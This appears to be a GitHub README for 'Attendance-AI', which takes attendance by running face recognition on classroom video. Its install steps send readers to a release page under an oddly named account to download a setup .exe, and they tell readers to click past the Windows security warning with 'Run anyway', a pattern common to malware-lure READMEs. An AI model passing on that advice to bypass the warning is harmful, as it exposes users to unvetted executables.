---
layout: "default"
title: "📷 Attendance-AI - Automated classroom attendance via face recognition"
description: "Automate student attendance tracking using InsightFace and OpenCV to process classroom video feeds and generate real-time reports via a Streamlit dashboard."
---
# 📷 Attendance-AI - Automated classroom attendance via face recognition

[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases)

Attendance-AI tracks student presence in classrooms using video footage. This system captures student faces and matches them against a saved database. It updates attendance records in real time. Teachers save time on manual roll calls. Administrators get accurate data for school reporting.

## 📋 System requirements

Your computer needs to meet these basic standards to run the software:

*   **Operating System:** Windows 10 or Windows 11.
*   **Processor:** Intel Core i5 or AMD Ryzen 5 processor.
*   **Memory:** 8 gigabytes of RAM or more.
*   **Graphics:** A dedicated graphics card helps with processing but remains optional.
*   **Storage:** At least 500 megabytes of free space for the application and database logs.
*   **Camera:** A stable web camera or an existing video file of the classroom.

## 📥 How to download the software

Follow these steps to obtain the installer for your computer:

1.  Visit the official release page: [https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases)
2.  Look for the section labeled "Assets" at the bottom of the newest release version.
3.  Click the file named `Attendance-AI-Setup.exe` to start the download.
4.  Save the file to your "Downloads" folder.

## 🛠️ Setting up the application

Once you download the installer, perform these actions to get started:

1.  Open your "Downloads" folder.
2.  Double-click the `Attendance-AI-Setup.exe` file.
3.  If Windows shows a security prompt, click "More info" and then "Run anyway."
4.  Follow the instructions on the screen.
5.  Click "Finish" to complete the installation.
6.  Find the "Attendance-AI" icon on your desktop and double-click it.

## ⚙️ Initial configuration

When you open the application for the first time, you must connect the software to your data account:

1.  The app opens a browser window.
2.  Enter the URL for your Supabase database project.
3.  Provide your specific API key if prompted.
4.  Click "Connect" to verify the link.
5.  The system confirms the connection with a green checkmark.

## 📹 Recording attendance

Follow these steps to process a classroom video:

1.  Navigate to the "Upload" tab in the application.
2.  Click "Select Video" to browse your computer for the classroom footage.
3.  Choose the video file and click "Open."
4.  Adjust the "Confidence Threshold" slider if the system misses students who sit far from the camera.
5.  Click "Start Recognition" to run the process.
6.  Wait for the progress bar to reach the end.
7.  The application highlights recognized faces with green boxes.

## 📊 Viewing attendance records

The system pushes records to your database immediately after processing:

*   Go to the "Reports" tab to see a list of dates.
*   Select a specific date to view which students appeared in the video.
*   Export these records as a spreadsheet file by clicking the "Export CSV" button.
*   Use the search bar at the top of the page to find specific students by name.

## 🔧 Troubleshooting common problems

If you experience difficulties, check these common fixes:

*   **Software does not open:** Ensure you installed the latest version. Restart your computer and try again.
*   **Missing students:** Make sure the classroom video shows clear faces. Blurry video makes face recognition difficult.
*   **Database error:** Double-check your internet connection. Confirm that your Supabase credentials remain correct in the settings menu.
*   **High CPU usage:** The recognition process requires significant computer power. Close other heavy programs like video editors or games while running the analysis.
*   **Camera access:** If you use a live camera, ensure privacy settings allow the application to access your webcam.

## 💡 Best practices for better results

To get the most out of the system, maintain these standards:

*   **Lighting:** Ensure the classroom has even lighting. Avoid shadows across student faces.
*   **Camera Angle:** Place the camera at eye level. Avoid steep angles from the ceiling or floor.
*   **Video Quality:** Use high-resolution video files. Low-resolution video prevents the system from distinguishing individual features.
*   **Clear Views:** Ask students to sit in a way that avoids blocking others. Obstructions prevent the scanner from detecting faces.

## 📁 Project information

This project relies on several open-source libraries:

*   **Streamlit:** Provides the user interface.
*   **InsightFace:** Detects and verifies faces.
*   **OpenCV:** Handles video file decoding.
*   **Supabase:** Stores attendance data securely.
*   **Python:** The programming language used to build the tool.

For developers interested in the internal logic, the source code remains open. You can find technical documentation inside the "docs" folder of the repository. Use standard Python tools to modify the code if you need custom features. All contributions help improve the accuracy of the software.